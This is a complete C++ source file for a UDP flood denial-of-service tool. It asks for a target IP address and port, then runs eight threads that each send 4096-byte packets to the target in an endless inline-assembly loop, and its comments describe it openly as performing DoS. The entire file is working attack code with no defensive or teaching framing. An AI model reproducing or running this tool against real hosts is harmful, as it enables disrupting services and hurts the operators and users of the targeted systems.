// Including all necessary libraries for the Ethernet
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Including input/output stream library
#include <iostream>
// Including library for multithreading
#include <thread>

#define ArrayLen 4096

int sock;
sockaddr_in Sockaddr_DoS;

// Function that is doing DoS
inline void Sending(){

	char Data[ArrayLen];
	
	__asm__("LABEL:");
	sendto(sock, Data, ArrayLen, 0, (sockaddr*)&Sockaddr_DoS, sizeof(Sockaddr_DoS));
	__asm__("jmp LABEL");

}

int main(){

  // Creating socket
	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	Sockaddr_DoS.sin_family = AF_INET;

	std::string IP, PORT;

  // Asking user for IP address and port for DoS.
	std::cout << " [!] Type IP-Address:";
	std::cin >> IP;
	std::cout << " [!] Type PORT: ";
	std::cin >> PORT;
	std::cout << std::endl;

  // Preparing socket
	inet_pton(AF_INET, IP.c_str(), &Sockaddr_DoS.sin_addr.s_addr);
	Sockaddr_DoS.sin_port = htons(atoi(PORT.c_str()));

  // Beginning DoS on 8 threads
	std::thread t1{ Sending }; 
	std::thread t2{ Sending };
	std::thread t3{ Sending };
	std::thread t4{ Sending };

	std::thread t5{ Sending };
	std::thread t6{ Sending };
	std::thread t7{ Sending };
	std::thread t8{ Sending };

	t1.join();
	t2.join();
	t3.join();
	t4.join();
	t5.join();
	t6.join();
	t7.join();
	t8.join();

	return 0;
}
